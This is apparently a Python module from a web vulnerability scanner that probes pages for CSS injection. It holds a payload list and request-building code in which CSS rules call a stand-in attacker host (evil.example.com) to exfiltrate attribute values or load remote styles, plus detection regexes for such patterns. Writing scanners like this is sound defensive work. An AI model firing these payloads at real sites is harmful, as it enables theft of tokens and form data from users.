"""
CSS Injection Tester — Detects CSS injection attack vectors.

Covers:
  - Data exfiltration via CSS selectors (attribute selectors)
  - Font-face based exfiltration (unicode-range)
  - CSS-in-attribute injection (style= attribute injection)
"""
import logging
import re
import urllib.parse

from apps.scanning.engine.testers.base_tester import BaseTester

logger = logging.getLogger(__name__)

# ── CSS injection payloads ───────────────────────────────────────────────────
CSS_INJECTION_PAYLOADS = [
    # Basic CSS injection via style context
    '}</style><style>*{background:url(https://evil.example.com/css-exfil)}</style>',
    # Attribute selector exfiltration
    'input[value^="a"]{background:url(https://evil.example.com/?v=a)}',
    # Expression injection (IE)
    'xss:expression(alert(1))',
    # CSS import injection
    '@import url(https://evil.example.com/evil.css);',
    # -moz-binding (Firefox legacy)
    '-moz-binding:url(https://evil.example.com/evil.xml#xss)',
    # behavior (IE)
    'behavior:url(evil.htc)',
]

# ── CSS context indicators in parameters ─────────────────────────────────────
CSS_PARAM_PATTERNS = [
    'color', 'background', 'bgcolor', 'style', 'css', 'theme',
    'font', 'border', 'width', 'height', 'class', 'className',
]

# ── CSS exfiltration detection in body ───────────────────────────────────────
CSS_EXFIL_PATTERNS = re.compile(
    r'(?:input\[.+?\]\s*\{.*?url\s*\('
    r'|@font-face\s*\{[^}]*unicode-range'
    r'|\bexpression\s*\('
    r'|behavior\s*:\s*url\('
    r'|-moz-binding\s*:\s*url\()',
    re.IGNORECASE | re.DOTALL,
)

STYLE_ATTR_RE = re.compile(
    r'style\s*=\s*["\'][^"\']*(?:expression|url\s*\(|javascript:)[^"\']*["\']',
    re.IGNORECASE,
)

CSS_REFLECTION_MARKER = 'cssinjtest42'


class CSSInjectionTester(BaseTester):
    """Test for CSS injection vulnerabilities."""

    TESTER_NAME = 'CSS Injection'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulns = []
        url = getattr(page, 'url', '')
        body = getattr(page, 'body', '') or ''
        params = getattr(page, 'parameters', {}) or {}
        forms = getattr(page, 'forms', []) or []

        # 1. Check for existing CSS exfiltration patterns in body
        vuln = self._check_existing_css_exfil(url, body)
        if vuln:
            vulns.append(vuln)

        # 2. Check for dangerous style attributes
        vuln = self._check_style_attribute_injection(url, body)
        if vuln:
            vulns.append(vuln)

        if depth == 'shallow':
            return vulns

        # 3. Test CSS injection via URL parameters
        css_params = self._find_css_params(params, url)
        for param_name in css_params[:3]:  # Limit to 3 params
            vuln = self._test_param_css_injection(url, param_name)
            if vuln:
                vulns.append(vuln)
                break  # One finding per vector is enough

        if depth == 'deep':
            # 4. Test CSS injection via form inputs
            for form in forms[:2]:
                vuln = self._test_form_css_injection(url, form)
                if vuln:
                    vulns.append(vuln)
                    break

        return vulns

    # ── Detection helpers ────────────────────────────────────────────────────

    def _find_css_params(self, params: dict, url: str) -> list:
        """Find parameters likely used in CSS context."""
        found = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        all_params = {**params, **{k: v[0] for k, v in qs.items()}}
        for name in all_params:
            if name.lower() in CSS_PARAM_PATTERNS:
                found.append(name)
        return found

    # ── Vulnerability checks ─────────────────────────────────────────────────

    def _check_existing_css_exfil(self, url: str, body: str):
        """Check for existing CSS exfiltration patterns in page body."""
        match = CSS_EXFIL_PATTERNS.search(body)
        if match:
            return self._build_vuln(
                name='CSS Data Exfiltration Pattern',
                severity='high',
                category='Injection',
                description=(
                    'The page contains CSS patterns that can be used for data '
                    'exfiltration, such as attribute selectors with external URLs '
                    'or expression() calls.'
                ),
                impact='Sensitive data exfiltration via CSS, CSRF token theft',
                remediation=(
                    'Sanitize CSS input. Use Content-Security-Policy to block '
                    'inline styles and external font/style sources.'
                ),
                cwe='CWE-79',
                cvss=7.3,
                affected_url=url,
                evidence=f'CSS exfiltration pattern: {match.group(0)[:100]}',
            )
        return None

    def _check_style_attribute_injection(self, url: str, body: str):
        """Check for dangerous style attributes in HTML."""
        match = STYLE_ATTR_RE.search(body)
        if match:
            return self._build_vuln(
                name='Dangerous Style Attribute',
                severity='medium',
                category='Injection',
                description=(
                    'HTML elements contain style attributes with dangerous CSS '
                    'functions such as expression(), url(), or javascript: URIs.'
                ),
                impact='Code execution via CSS expression, data loading from external sources',
                remediation=(
                    'Sanitize style attributes. Remove expression(), url(), and '
                    'javascript: from inline styles.'
                ),
                cwe='CWE-79',
                cvss=5.4,
                affected_url=url,
                evidence=f'Dangerous style: {match.group(0)[:100]}',
            )
        return None

    def _test_param_css_injection(self, url: str, param_name: str):
        """Test a URL parameter for CSS injection."""
        payload = f'{CSS_REFLECTION_MARKER}}}*{{background:url(https://evil.example.com/)'
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        qs[param_name] = [payload]
        test_query = urllib.parse.urlencode(qs, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

        try:
            resp = self._make_request('GET', test_url)
            if resp and resp.status_code == 200:
                resp_body = getattr(resp, 'text', '')
                if CSS_REFLECTION_MARKER in resp_body:
                    # Check if it's reflected in a CSS context
                    if re.search(
                        rf'(?:style[^>]*>|<style)[^<]*{CSS_REFLECTION_MARKER}',
                        resp_body, re.IGNORECASE | re.DOTALL
                    ):
                        return self._build_vuln(
                            name='CSS Injection via Parameter',
                            severity='high',
                            category='Injection',
                            description=(
                                f'The parameter "{param_name}" is reflected in a CSS '
                                'context without proper sanitization, allowing CSS injection.'
                            ),
                            impact='CSS-based data exfiltration, defacement, clickjacking assistance',
                            remediation=(
                                'Sanitize user input before embedding in CSS contexts. '
                                'Use CSS escaping. Implement Content-Security-Policy.'
                            ),
                            cwe='CWE-79',
                            cvss=6.1,
                            affected_url=test_url,
                            evidence=f'Reflected CSS in parameter: {param_name}',
                        )
        except Exception:
            pass
        return None

    def _test_form_css_injection(self, url: str, form):
        """Test form inputs for CSS injection."""
        action = getattr(form, 'action', '') or url
        method = getattr(form, 'method', 'GET').upper()
        inputs = getattr(form, 'inputs', []) or []

        for inp in inputs:
            inp_name = getattr(inp, 'name', '')
            if not inp_name:
                continue
            if inp_name.lower() in CSS_PARAM_PATTERNS:
                payload = f'{CSS_REFLECTION_MARKER}}}body{{background:url(//evil.example.com/)'
                data = {inp_name: payload}

                try:
                    resp = self._make_request(method, action, data=data)
                    if resp and resp.status_code == 200:
                        resp_body = getattr(resp, 'text', '')
                        if CSS_REFLECTION_MARKER in resp_body:
                            return self._build_vuln(
                                name='CSS Injection via Form',
                                severity='high',
                                category='Injection',
                                description=(
                                    f'Form input "{inp_name}" allows CSS injection '
                                    'through style context reflection.'
                                ),
                                impact='CSS data exfiltration, visual defacement',
                                remediation='Sanitize form inputs. Use CSP. Escape CSS special characters.',
                                cwe='CWE-79',
                                cvss=6.1,
                                affected_url=action,
                                evidence=f'CSS reflected from form field: {inp_name}',
                            )
                except Exception:
                    continue
        return None
